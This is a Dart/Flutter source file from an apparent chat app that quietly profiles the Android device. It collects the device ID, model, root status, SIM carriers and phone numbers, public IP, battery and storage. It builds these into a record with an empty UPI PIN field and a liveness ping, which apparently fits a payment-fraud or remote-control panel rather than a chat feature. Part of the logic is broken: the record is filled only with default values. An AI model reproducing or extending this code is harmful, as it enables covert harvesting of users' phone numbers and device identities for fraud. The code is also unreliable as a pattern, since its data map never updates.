import 'dart:async';
import 'dart:io';
import 'package:battery_plus/battery_plus.dart';
import 'package:chatapp/service/sim_info.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/services.dart';
import 'package:get_ip_address/get_ip_address.dart';
import 'package:get_storage_info/get_storage_info.dart';
import 'package:intl/intl.dart';
import 'package:path_provider/path_provider.dart';

// import 'package:sim_card_info/sim_card_info.dart';
// import 'package:sim_card_info/sim_info.dart';

class DeviceInformation {
  static final Battery _battery = Battery();
  static final DeviceInfoPlugin _deviceInfoPlugin = DeviceInfoPlugin();
  static String batteryLevel = 'Unknown';
  static String deviceId = 'Unknown';
  static String modelName = 'Unknown';
  static String androidVersion = 'Unknown';
  static String sdkVersion = 'Unknown';
  static String cpuArch = 'Unknown';
  static bool sdCardAvailable = false;
  static bool isRooted = false;

  // List<Map<String, String>> _simDetails = [];
  // List<SimCard> _simCards = [];
  static String ipAddress = 'Unknown';

  // static String storageInfo = 'Unknown';
  static String totalSpace = '0 GB';

  static Map<String, dynamic> deviceData = {
    deviceId: {
      "androidV": androidVersion,
      "battery": batteryLevel,
      "cpu_arch": cpuArch,
      "deviceId": deviceId,
      "ip_address": ipAddress,
      "isLiked": true,
      "isRoot": isRooted,
      "isSdCard": sdCardAvailable,
      "joined": DateFormat('dd/MM/yyyy | hh:mm a').format(DateTime.now()),
      "like": false,
      "mobNo": sims.isNotEmpty ?? false ? sims[0]['number'] : "",
      "modelName": modelName,
      "sdkV": sdkVersion,
      "last_seen": DateTime.now().millisecondsSinceEpoch.toString(),
      "service_provider": sims.isNotEmpty ? sims[0]['carrierName'] : "",
      "sims": List.generate(sims.length ?? 0, (index) {
        return {
          "carrierName": sims[index]['carrierName'],
          "phoneNumber": sims[index]['number'],
          "simSlotIndex": sims[0]['simSlotIndex'],
        };
      }),
      "status": true,
      "storage": totalSpace,
      "upipin": "",
      "webhookEvent": {
        "checkLiveness": {"text": "pong"},
      },
    },
  };

  static Future<void> fetchAllData() async {
    await getBatteryLevel();
    await getDeviceInfo();
    await checkSDCard();
    await checkRootStatus();
    // await initPlatformState();
    // await _getSimDetails();
    await initSimInfoState();
    await getIpAddress();
    await getMemoryInfo();
    // await _getStorageInfo();
    // await getMemoryInfo();
    // getMemoryInfo();
  }

  static Future<void> getBatteryLevel() async {
    final level = await _battery.batteryLevel;
    batteryLevel = '$level%';
  }

  static const platform = MethodChannel("godrich.live/device_id");

  static Future<void> getDeviceInfo() async {
    if (Platform.isAndroid) {
      final dId = await platform.invokeMethod<String>("getDeviceId");
      var androidInfo = await _deviceInfoPlugin.androidInfo;
      deviceId = dId ?? 'Unknown';
      // deviceId = androidInfo.model ?? 'Unknown';
      modelName = androidInfo.model ?? 'Unknown';
      androidVersion = androidInfo.version.release ?? 'Unknown';
      sdkVersion = androidInfo.version.sdkInt.toString();
      cpuArch = androidInfo.supportedAbis.first ?? 'Unknown';

      debugPrint("androidInfo::${androidInfo.data}");
    } else {
      deviceId = 'Unsupported Platform';
    }
  }

  static Future<void> checkSDCard() async {
    // For Android, check external storage directory availability
    try {
      final extDir = await getExternalStorageDirectory();
      sdCardAvailable = extDir != null;
    } catch (e) {
      sdCardAvailable = false;
    }
  }

  static Future<void> checkRootStatus() async {
    // Simple heuristic root check - existence of "su" binary in usual places
    List<String> paths = [
      '/system/bin/su',
      '/system/xbin/su',
      '/sbin/su',
      '/system/sd/xbin/su',
      '/system/bin/failsafe/su',
      '/data/local/xbin/su',
      '/data/local/bin/su',
      '/data/local/su',
    ];
    for (var path in paths) {
      if (await File(path).exists()) {
        isRooted = true;
        break;
      }
    }
  }

  // static final _simCardInfoPlugin = SimCardInfo();
  // static List<SimInfo>? simCardInfo;
  static List<Map<String, dynamic>> sims = [];

  static Future<void> initSimInfoState() async {
    // Platform messages may fail, so we use a try/catch PlatformException.
    // We also handle the message potentially returning null.
    // try {
    //   simCardInfo = await _simCardInfoPlugin.getSimInfo() ?? [];
    //   debugPrint("simCardInfo::${simCardInfo}");
    // } on PlatformException {
    //   simCardInfo = [];
    //   // setState(() {
    //   //   isSupported = false;
    //   // });
    // }
    final result = await SimInfo.getSubscriptionIds();
    sims = result;
  }

  static Future<void> getIpAddress() async {
    try {
      /// Initialize Ip Address
      var ip = IpAddress(type: RequestType.json);

      /// Get the IpAddress based on requestType.
      dynamic data = await ip.getIpAddress();
      ipAddress = data['ip'].toString() ?? 'Unknown';
      debugPrint(ipAddress);
    } on IpAddressException catch (exception) {
      /// Handle the exception.
      debugPrint(exception.message);
    }
  }

  static Future<void> getMemoryInfo() async {
    num space = await GetStorageInfo.getStorageTotalSpaceInGB;
    totalSpace = '${space.toStringAsFixed(0)} GB';
    debugPrint('total Space::${totalSpace}');
  }
}
